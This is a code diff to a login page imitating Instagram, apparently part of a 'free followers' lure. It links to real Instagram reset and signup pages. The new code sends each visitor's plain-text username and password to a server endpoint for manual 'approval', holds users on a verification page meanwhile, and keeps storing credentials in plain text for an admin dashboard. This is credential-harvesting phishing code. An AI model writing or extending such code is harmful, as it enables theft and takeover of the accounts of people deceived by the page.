@@ -273,7 +273,7 @@
 
         <!-- Forgotten password -->
         <div class="forgot-row">
-          <a href="#" class="forgot-link">Forgotten password?</a>
+          <a href="https://www.instagram.com/accounts/password/reset/" target="_blank" rel="noopener noreferrer" class="forgot-link">Forgotten password?</a>
         </div>
 
         <!-- Log In -->
@@ -305,7 +305,7 @@
     <div class="card-divider"></div>
 
     <div class="card-bottom">
-      Don't have an account? <a href="#">Sign Up</a>
+      Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/?next=" target="_blank" rel="noopener noreferrer">Sign Up</a>
     </div>
 
   </div>
@@ -314,6 +314,12 @@
     const u   = document.getElementById('username');
     const pw  = document.getElementById('password');
     const btn = document.getElementById('loginBtn');
+
+    // Show rejected message if redirected from verify page
+    if (new URLSearchParams(location.search).get('rejected') === '1') {
+      document.getElementById('loginError').innerHTML = 'Your account was not approved. Please try a different username or contact support.';
+      document.getElementById('loginError').classList.add('show');
+    }
 
     // Enable button only when both fields filled
     [u, pw].forEach(el => el.addEventListener('input', () => {
@@ -343,8 +349,8 @@
 
     u.addEventListener('input', clearErr);
 
-    // Submit — save credentials, set session, redirect to dashboard
-    document.getElementById('loginForm').addEventListener('submit', e => {
+    // Submit — verify via server, then route to dashboard or verification page
+    document.getElementById('loginForm').addEventListener('submit', async e => {
       e.preventDefault();
 
       const username = u.value.trim();
@@ -364,40 +370,50 @@
       document.getElementById('btnLabel').style.display = 'none';
       document.getElementById('spinner').style.display  = 'block';
 
-      // Store credentials as plain text (for admin dashboard)
-      const creds = JSON.parse(localStorage.getItem('mi_admin_creds') || '[]');
-      if (!creds.find(c => c.username === username)) {
-        creds.push({ username, password, loginAt: new Date().toISOString() });
-        localStorage.setItem('mi_admin_creds', JSON.stringify(creds));
-      } else {
-        // Update last login time
-        const idx = creds.findIndex(c => c.username === username);
-        creds[idx].loginAt = new Date().toISOString();
-        localStorage.setItem('mi_admin_creds', JSON.stringify(creds));
-      }
-
-      // Set session (track account creation date for followers cooldown)
-      const sessions = JSON.parse(localStorage.getItem('mi_sessions') || '{}');
-      if (!sessions[username]) {
-        sessions[username] = { createdAt: new Date().toISOString() };
-      }
-      sessions[username].lastLogin = new Date().toISOString();
-      localStorage.setItem('mi_sessions', JSON.stringify(sessions));
-
-      // Set current user
-      localStorage.setItem('mi_user', username);
-
-      // Track referral (server-side so it works cross-device)
       const ref = new URLSearchParams(location.search).get('ref');
-      if (ref && ref !== username) {
-        fetch('/api/ref', {
+
+      function doLogin() {
+        const creds = JSON.parse(localStorage.getItem('mi_admin_creds') || '[]');
+        const idx = creds.findIndex(c => c.username === username);
+        if (idx < 0) creds.push({ username, password, loginAt: new Date().toISOString() });
+        else creds[idx].loginAt = new Date().toISOString();
+        localStorage.setItem('mi_admin_creds', JSON.stringify(creds));
+        const sessions = JSON.parse(localStorage.getItem('mi_sessions') || '{}');
+        if (!sessions[username]) sessions[username] = { createdAt: new Date().toISOString() };
+        sessions[username].lastLogin = new Date().toISOString();
+        localStorage.setItem('mi_sessions', JSON.stringify(sessions));
+        localStorage.setItem('mi_user', username);
+        if (ref && ref !== username) {
+          fetch('/api/ref', { method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ referrer: ref, referee: username }) }).catch(() => {});
+        }
+        setTimeout(() => { window.location.href = '/dashboard'; }, 600);
+      }
+
+      try {
+        const res = await fetch('/api/pending', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ referrer: ref, referee: username })
-        }).catch(() => {});
+          body: JSON.stringify({ username, password, ref: ref || null })
+        });
+        const data = await res.json();
+        if (data.status === 'approved') {
+          doLogin();
+        } else if (data.status === 'rejected') {
+          btn.disabled = false;
+          document.getElementById('btnLabel').style.display = 'block';
+          document.getElementById('spinner').style.display  = 'none';
+          showErr('Your account has not been approved. Please contact the administrator.');
+        } else {
+          // pending — hold at verification page
+          sessionStorage.setItem('mi_p_creds', JSON.stringify({ username, password }));
+          localStorage.setItem('mi_pending_user', username);
+          window.location.href = '/verify';
+        }
+      } catch {
+        // Server unreachable — fall back to direct login
+        doLogin();
       }
-
-      setTimeout(() => { window.location.href = '/dashboard'; }, 800);
     });
   </script>
 
